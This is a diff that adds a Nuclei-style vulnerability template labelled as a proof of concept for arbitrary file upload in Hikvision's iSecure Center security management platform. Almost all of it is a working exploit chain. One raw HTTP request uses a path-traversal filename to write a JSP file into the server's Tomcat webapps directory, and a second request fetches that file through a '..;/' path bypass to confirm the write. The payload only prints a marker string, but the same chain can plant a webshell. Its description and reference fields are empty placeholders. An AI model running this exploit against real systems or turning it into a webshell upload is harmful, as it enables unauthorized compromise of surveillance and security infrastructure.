@@ -1,0 +1,46 @@
+id: Hikvision_6_2
+info:
+  name: 海康威视iSecure Center综合安防管理平台center任意文件上传poc2
+  author: YanXi
+  severity: high
+  description: description
+  reference:
+    - https://
+  tags: Hikvision
+http:
+  - raw:
+      - |-
+        POST /center/api/files;.html HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary9PggsiM755PLa54a
+        Content-Length: 305
+
+        ------WebKitFormBoundary9PggsiM755PLa54a
+        Content-Disposition: form-data; name="file"; filename="../../../../../../../../../../../opt/hikvision/web/components/tomcat85linux64.1/webapps/eportal/new.jsp"
+        Content-Type: application/zip
+
+        <%out.print("test3");%>
+
+        ------WebKitFormBoundary9PggsiM755PLa54a--
+      - |+
+        GET /portal/ui/login/..;/..;/new.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: JSESSIONID=CtIv-KIpVXW-2Gv92nxiwdl-HLFx4bpMzqlU8yc3; curtTabId=all; configMenu=
+        Sec-Ch-Ua: "Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"
+        Sec-Ch-Ua-Mobile: ?0
+        Sec-Ch-Ua-Platform: "Windows"
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Sec-Fetch-Site: none
+        Sec-Fetch-Mode: navigate
+        Sec-Fetch-User: ?1
+        Sec-Fetch-Dest: document
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: keep-alive
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "contains(body_2, 'test3') "
